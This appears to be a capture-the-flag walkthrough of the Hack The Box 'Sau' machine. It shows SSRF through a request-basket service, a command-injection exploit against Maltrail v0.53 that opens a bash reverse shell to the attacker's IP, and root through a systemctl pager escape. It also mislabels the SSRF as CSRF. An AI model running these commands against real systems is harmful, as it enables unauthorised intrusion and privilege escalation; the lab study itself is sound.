### Nmap 

```
sudo nmap -sC -sV -oN sau-nmap 10.10.11.224
```

![[Pasted image 20250425225807.png]]
- http filtered
- maybe site at 55555

Browse to site over port 55555

![[Pasted image 20250425225959.png]]

Create new basket
![[Pasted image 20250425230058.png]]

Open the basket 

![[Pasted image 20250425230121.png]]

Copy the "requests to" url and run curl 

![[Pasted image 20250425230330.png]]


Refresh webpage and can see curl request 

![[Pasted image 20250425230235.png]]

Try to insert user agent with curl -A

```
curl http://10.10.11.224:55555/2jmmeym -A "Please Subscribe"
```

![[Pasted image 20250425230418.png]]
- web page reflects user agent

Try inserting special characters with curl request for SSTI

```
curl http://10.10.11.224:55555/2jmmeym -A "{{ Please Subscribe }}'\" Thank You"
```

Response 
![[Pasted image 20250425231033.png]]
Going over to Burp to view request.

First, viewing settings on webpage and see a Forward URL.

Enter in Kali IP..

![[Pasted image 20250425231255.png]]

Then start nc listener on port 80 

```
sudo nc -lvnp 80
```

Then curl 

![[Pasted image 20250425231407.png]]

nc poppin off

![[Pasted image 20250425231425.png]]

Going back to web settings and check proxy response 

![[Pasted image 20250425231513.png]]

Reset nc listener and resend the curl 

![[Pasted image 20250425231603.png]]
- difference is curl is hanging bc it's waiting for the server to respond

If we type within nc window, it is reflected in the curl 
![[Pasted image 20250425231721.png]]
- we have CSRF

Again in the web settings, change forward url to 127.0.0.1

![[Pasted image 20250425231818.png]]

Now re-running the curl gives us a website 

![[Pasted image 20250425232228.png]]
![[Pasted image 20250425232245.png]]

Try browsing to this site

![[Pasted image 20250426113441.png]]
- Broken links
- Maltrail (v0.53) 

Google this to find an exploit

[Exploiting Maltrail v0.53 Unauthenticated RCE](https://securitylit.medium.com/exploiting-maltrail-v0-53-unauthenticated-remote-code-execution-rce-66d0666c18c5)

PoC:

```
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`'
```

First, try navigating to login in the URL

![[Pasted image 20250426113923.png]]
- Nope

Navigate back to bucket and edit the Forward URL in the config settings to redirect to login page. 

![[Pasted image 20250426114023.png]]

Now, retry navigating to /login


Create reverse shell payload to send through the curl request.

```
echo -n 'bash -i >& /dev/tcp/<KALI-IP-ADDRESS>/9001 0>&1' | base64 -w0
```

![[Pasted image 20250426114516.png]]

Get rid of any special characters (+, =, etc) by adding additional spaces around where the special characters are. 

Then copy + paste base64 encoded reverse shell and plop into curl request. 

Create the curl request / exploit

```
curl http://10.10.11.224:55555/isxcqgp/ -d 'username=;`echo YmFzafsayufagdigdi | base64 -d | bash`'
```

Set-up nc listener on 9001 and catch reverse shell 

![[Pasted image 20250426114831.png]]

Spawn TTY shell 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```
stty raw -echo;fg
```

```
export TERM=xterm
```

Now we're the maltrail user. 

First, look for any passwords

Such as within this config file.

```
cat maltrail.conf | grep -i pass
```

![[Pasted image 20250426115223.png]]

Grep or anything that begins with a comment 

```
cat maltrail.conf | grep -v '^#' | grep .
```
![[Pasted image 20250426115300.png]]
- we got admin hash

But googling the hash (it's default) shows that is a default password of changeme

Is there a user on the box?

Try `sudo -l`
![[Pasted image 20250426115530.png]]
- we can run status trail.service 

Just run 

```
sudo /usr/bin/systemctl status trail.service
```

![[Pasted image 20250426115643.png]]
- in a pager

Just executed 
```
!/bin/sh
```

and am the root user.

![[Pasted image 20250426120243.png]]

